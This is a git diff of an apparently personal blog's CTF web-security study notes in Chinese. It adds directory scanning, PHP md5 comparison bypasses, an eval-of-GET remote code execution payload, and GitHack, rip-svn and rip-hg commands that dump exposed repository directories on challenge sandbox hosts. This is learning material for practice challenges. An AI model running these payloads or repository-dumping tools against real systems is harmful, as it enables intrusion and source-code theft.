@@ -15,7 +15,7 @@
 <meta property="og:description" content="为了就业方便，偶尔还是要学一学Web QAQ">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-01-09T08:51:23.000Z">
-<meta property="article:modified_time" content="2023-01-10T07:06:32.954Z">
+<meta property="article:modified_time" content="2023-01-14T02:20:29.376Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
@@ -100,13 +100,18 @@
       <div class="toc-parent">
   <div id="toc" class="toc-article">
     <div class="toc-title">目录</div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">XSS跨站脚本攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">CSRF跨站请求伪造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">SSRF服务端请求伪造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">PHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-text">PHP中的各种函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include-once-%EF%BC%9A"><span class="toc-text">include_once()：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BC%B1%E6%AF%94%E8%BE%83-%E5%92%8C%E5%BC%BA%E6%AF%94%E8%BE%83"><span class="toc-text">PHP弱比较(&#x3D;&#x3D;)和强比较(&#x3D;&#x3D;&#x3D;)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">PHP伪协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%90%8E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%94%A8%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">传入一句话木马后，直接用中国蚁剑连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8GET%E4%BC%A0%E5%8F%82%E6%9D%A5RCE"><span class="toc-text">利用GET传参来RCE</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips"><span class="toc-text">Tips:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8"><span class="toc-text">浏览器安全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-text">XSS跨站脚本攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">CSRF跨站请求伪造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">SSRF服务端请求伪造</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">PHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-text">PHP中的各种函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include-once-%EF%BC%9A"><span class="toc-text">include_once()：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BC%B1%E6%AF%94%E8%BE%83-%E5%92%8C%E5%BC%BA%E6%AF%94%E8%BE%83"><span class="toc-text">PHP弱比较(&#x3D;&#x3D;)和强比较(&#x3D;&#x3D;&#x3D;)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">PHP伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">变量覆盖漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">代码执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%90%8E%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%94%A8%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">传入一句话木马后，直接用中国蚁剑连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8GET%E4%BC%A0%E5%8F%82%E6%9D%A5RCE"><span class="toc-text">利用GET传参来RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-text">点击劫持</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML5%E5%AE%89%E5%85%A8"><span class="toc-text">HTML5安全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="toc-text">Web框架安全</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Git%E6%B3%84%E9%9C%B2"><span class="toc-text">Git泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHUB%E2%80%94%E2%80%94log%EF%BC%88git%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-text">CTFHUB——log（git泄露）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHUB%E2%80%94%E2%80%94Stash%EF%BC%88git%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-text">CTFHUB——Stash（git泄露）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHUB%E2%80%94%E2%80%94Index%EF%BC%88git%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-text">CTFHUB——Index（git泄露）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SVN%E6%B3%84%E9%9C%B2"><span class="toc-text">SVN泄露</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HG%E6%B3%84%E9%9C%B2"><span class="toc-text">HG泄露</span></a></li></ol>
   </div>
 </div>
       <p><strong>为了就业方便，偶尔还是要学一学Web QAQ</strong></p>
 <span id="more"></span>
 
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="PHP中的各种函数"><a href="#PHP中的各种函数" class="headerlink" title="PHP中的各种函数"></a>PHP中的各种函数</h2><h3 id="include-once-："><a href="#include-once-：" class="headerlink" title="include_once()："></a>include_once()：</h3><p>在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p>
+<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><p>什么思路都没有的时候，可以用dirmap或者dirsearch扫一下网站目录，flag可能在phpinfo和.git里</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/dirmap &amp;&amp; python dirmap.py -i http://1.14.71.254:28685 -lcf</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h1 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h1><h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="PHP中的各种函数"><a href="#PHP中的各种函数" class="headerlink" title="PHP中的各种函数"></a>PHP中的各种函数</h2><h3 id="include-once-："><a href="#include-once-：" class="headerlink" title="include_once()："></a>include_once()：</h3><p>在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。</p>
 <h2 id="PHP弱比较-和强比较"><a href="#PHP弱比较-和强比较" class="headerlink" title="PHP弱比较(==)和强比较(===)"></a>PHP弱比较(==)和强比较(===)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">既要两变量个值不相同，又要两个变量md5值一样</span><br><span class="line">方法一： 可以使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等，而两个变量值不相等；</span><br><span class="line">方法二： 可以传递数组，如name[]=123,password[]=456，md5不能加密数组，故两个md5返回的都是null</span><br><span class="line"></span><br><span class="line">另：若遇到===这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同</span><br></pre></td></tr></table></figure>
 
 <p><strong>MD5值为0e开头的数字</strong></p>
@@ -124,19 +129,19 @@
 <p>7)glob:// 查找匹配的文件路径模式</p>
 <p>8)phar:// PHP归档</p>
 <p>9)rar:// RAR数据压缩</p>
-<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="传入一句话木马后，直接用中国蚁剑连接"><a href="#传入一句话木马后，直接用中国蚁剑连接" class="headerlink" title="传入一句话木马后，直接用中国蚁剑连接"></a>传入一句话木马后，直接用中国蚁剑连接</h2><h2 id="利用GET传参来RCE"><a href="#利用GET传参来RCE" class="headerlink" title="利用GET传参来RCE"></a>利用GET传参来RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">payload：http:<span class="comment">//1.14.71.254:28628/?url=system(%22cat%20/flllllaaaaaaggggggg%22);</span></span><br></pre></td></tr></table></figure>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="传入一句话木马后，直接用中国蚁剑连接"><a href="#传入一句话木马后，直接用中国蚁剑连接" class="headerlink" title="传入一句话木马后，直接用中国蚁剑连接"></a>传入一句话木马后，直接用中国蚁剑连接</h2><h2 id="利用GET传参来RCE"><a href="#利用GET传参来RCE" class="headerlink" title="利用GET传参来RCE"></a>利用GET传参来RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">payload：http:<span class="comment">//1.14.71.254:28628/?url=system(%22cat%20/flllllaaaaaaggggggg%22);</span></span><br></pre></td></tr></table></figure>
 
 
 
+<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><h1 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h1><h1 id="Web框架安全"><a href="#Web框架安全" class="headerlink" title="Web框架安全"></a>Web框架安全</h1><h1 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h1><h2 id="CTFHUB——log（git泄露）"><a href="#CTFHUB——log（git泄露）" class="headerlink" title="CTFHUB——log（git泄露）"></a>CTFHUB——log（git泄露）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用GitHack扫描</span><br><span class="line">python GitHack.py http://challenge-4be834ffe995c3a3.sandbox.ctfhub.com:10800/.git</span><br><span class="line">//日志文件会保存到GitHack目录中的dist目录下</span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git diff 91722f3ef9cad1bb2841623dd18efcf5966dbd32</span><br><span class="line">//查看flag</span><br></pre></td></tr></table></figure>
 
+<h2 id="CTFHUB——Stash（git泄露）"><a href="#CTFHUB——Stash（git泄露）" class="headerlink" title="CTFHUB——Stash（git泄露）"></a>CTFHUB——Stash（git泄露）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash list</span><br><span class="line">git stash pop //注意要用root权限</span><br></pre></td></tr></table></figure>
 
+<h2 id="CTFHUB——Index（git泄露）"><a href="#CTFHUB——Index（git泄露）" class="headerlink" title="CTFHUB——Index（git泄露）"></a>CTFHUB——Index（git泄露）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://challenge-b30f32f8760f958c.sandbox.ctfhub.com:10800/.git</span><br></pre></td></tr></table></figure>
 
+<h1 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//先进入工具目录</span><br><span class="line">./rip-svn.pl -v -u http://challenge-db225928ae10d29a.sandbox.ctfhub.com:10800/.svn</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">cd</span> .svn</span><br><span class="line"><span class="built_in">cd</span> pristine</span><br><span class="line"><span class="built_in">cd</span> 87</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">cat</span> 87cfa68f3ad388cc5010e87eb92ae7210a6564c9.svn-base </span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
+<h1 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./rip-hg.pl -v -u http://challenge-fd4d14ab800ba8d3.sandbox.ctfhub.com:10800/.hg/</span><br><span class="line"><span class="built_in">cd</span> .hg</span><br><span class="line"><span class="built_in">cd</span> store</span><br><span class="line"><span class="built_in">cat</span> fncache</span><br><span class="line">//得到data/flag_1296924402.txt.i，直接网址访问该文件</span><br></pre></td></tr></table></figure>
 
 
 
@@ -148,7 +153,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/01/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clcv8e1xh0014j8v0dv2v0r0z" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/01/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clcvbna9z0008ykv075y3fgpw" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -160,9 +165,9 @@
 <nav id="article-nav">
   
   
-    <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">CTF——Pwn学习记录</div>
+      <div class="article-nav-title">CTF——Pwn刷题记录</div>
     </a>
   
 </nav>
@@ -214,11 +219,11 @@
           </li>
         
           <li>
-            <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF——Pwn学习记录</a>
+            <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF——Pwn刷题记录</a>
           </li>
         
           <li>
-            <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF——Pwn刷题记录</a>
+            <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF——Pwn学习记录</a>
           </li>
         
           <li>
